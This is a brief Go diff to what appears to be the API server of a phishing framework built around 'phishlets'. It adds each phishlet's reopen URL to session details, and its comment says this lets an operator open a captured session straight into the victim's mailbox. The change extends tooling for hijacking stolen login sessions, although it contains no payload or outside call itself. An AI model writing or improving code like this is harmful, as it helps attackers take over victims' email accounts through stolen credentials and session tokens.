@@ -360,6 +360,11 @@ func (a *apiServer) handleSessionDetail(w http.ResponseWriter, r *http.Request) 
 		http.Error(w, `{"error":"not found"}`, http.StatusNotFound)
 		return
 	}
+	// enrich with the phishlet's reopen_url so `open <id>` can default to the
+	// right landing page (mailbox) instead of a generic office.com
+	if pl, err := a.cfg.GetPhishlet(s.Phishlet); err == nil && pl != nil {
+		s.ReopenUrl = pl.ReopenUrl
+	}
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(s)
 }
